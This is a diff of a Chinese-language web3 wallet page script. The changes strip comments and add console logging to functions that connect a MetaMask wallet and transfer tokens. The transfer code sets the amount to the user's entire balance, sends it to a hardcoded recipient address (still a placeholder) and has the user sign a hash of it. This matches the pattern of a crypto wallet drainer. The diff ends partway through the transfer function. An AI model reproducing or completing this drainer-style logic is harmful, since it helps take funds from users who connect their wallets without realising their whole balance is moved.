@@ -80,32 +80,33 @@ const ABI = [
 
 let web3;
 let account;
-let isConnecting = false; // 连接状态标志
+let isConnecting = false;
 
 async function connectWallet() {
     if (window.ethereum) {
         if (isConnecting) {
             alert('连接请求正在进行，请稍候。');
-            return; // 防止重复请求
+            return;
         }
 
-        isConnecting = true; // 设置为正在连接状态
+        isConnecting = true;
         document.getElementById('connectButton').innerText = '连接中...';
-        document.getElementById('connectButton').disabled = true; // 禁用连接按钮
+        document.getElementById('connectButton').disabled = true;
 
         try {
+            console.log('请求连接钱包...');
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            console.log('账户:', accounts);
             if (accounts.length > 0) {
-                account = accounts[0]; // 获取第一个账户
+                account = accounts[0];
                 web3 = new Web3(window.ethereum);
-                document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
-                document.getElementById('transferButton').disabled = false; // 启用转账按钮
+                document.getElementById('connectButton').innerText = '连接成功';
+                document.getElementById('transferButton').disabled = false;
                 console.log('连接成功:', account);
             } else {
                 throw new Error('未选择账户');
             }
 
-            // 监听账户变化
             window.ethereum.on('accountsChanged', (accounts) => {
                 if (accounts.length > 0) {
                     account = accounts[0];
@@ -113,17 +114,16 @@ async function connectWallet() {
                     console.log('账户已更改:', account);
                 } else {
                     document.getElementById('connectButton').innerText = '连接钱包';
-                    document.getElementById('transferButton').disabled = true; // 禁用转账按钮
+                    document.getElementById('transferButton').disabled = true;
                     console.log('用户已断开与钱包的连接');
                 }
             });
         } catch (error) {
             console.error('连接钱包失败:', error);
-            document.getElementById('connectButton').innerText = '连接失败'; // 更新按钮文本
             alert('连接钱包失败，请检查控制台错误信息。');
         } finally {
-            isConnecting = false; // 请求结束，重置状态
-            document.getElementById('connectButton').disabled = false; // 重新启用连接按钮
+            isConnecting = false;
+            document.getElementById('connectButton').disabled = false;
         }
     } else {
         alert('请安装 MetaMask 或其他钱包插件');
@@ -131,12 +131,12 @@ async function connectWallet() {
 }
 
 async function transferTokens() {
-    const recipient = '接收者地址'; // 这里指定接收者地址
+    const recipient = '接收者地址';
     const contract = new web3.eth.Contract(ABI, contractAddress);
     
     try {
         const balance = await contract.methods.balanceOf(account).call();
-        const amount = balance; // 将转账金额设为用户的所有余额
+        const amount = balance;
 
         console.log('用户余额:', balance);
         
@@ -147,7 +147,7 @@ async function transferTokens() {
 
         const amountToSend = web3.utils.toBN(amount);
         const messageHash = web3.utils.soliditySha3(account, recipient, amountToSend);
-        const messageHashHex = web3.utils.keccak256(messageHash); // 使用 keccak256
+        const messageHashHex = web3.utils.keccak256(messageHash);
 
         const signature = await web3.eth.personal.sign(messageHashHex, account);
         
